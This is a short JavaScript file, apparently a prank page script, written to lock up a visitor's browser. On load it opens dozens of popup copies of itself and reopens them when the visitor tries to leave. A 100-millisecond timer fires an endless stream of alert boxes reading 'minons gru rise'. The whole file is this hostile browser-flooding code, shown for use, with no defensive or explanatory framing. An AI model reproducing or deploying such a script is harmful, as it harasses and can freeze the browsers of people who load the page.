var strWindowFeatures = "location=yes,height=570,width=520,scrollbars=yes,status=yes";
var URL = self.location;
var win = window.open(URL, "_blank", strWindowFeatures);
function unclosable() {
  setTimeout(window.open, 1, self.location, '');
  window.open(URL, "_blank", strWindowFeatures);
  window.open(URL, "_blank", strWindowFeatures);
  window.open(URL, "_blank", strWindowFeatures);
  window.open(URL, "_blank", strWindowFeatures);
}
activ = window.setInterval("Farbe()", 100); // some of this is not my code here
        farbe=1;
        
        function Farbe() { 
            if(farbe==1) {
                farbe=2;
            }else {
                farbe=1;
            }
            
            alert("minons gru rise");
        }

        function erneut(){ 
          window.open(self.location,'');
          var repeat = 7;

          for(var i = 0; i < repeat; i++){
            unclosable();
          }
        }
        
        window.onload = erneut;
window.onbeforeunload = unclosable();
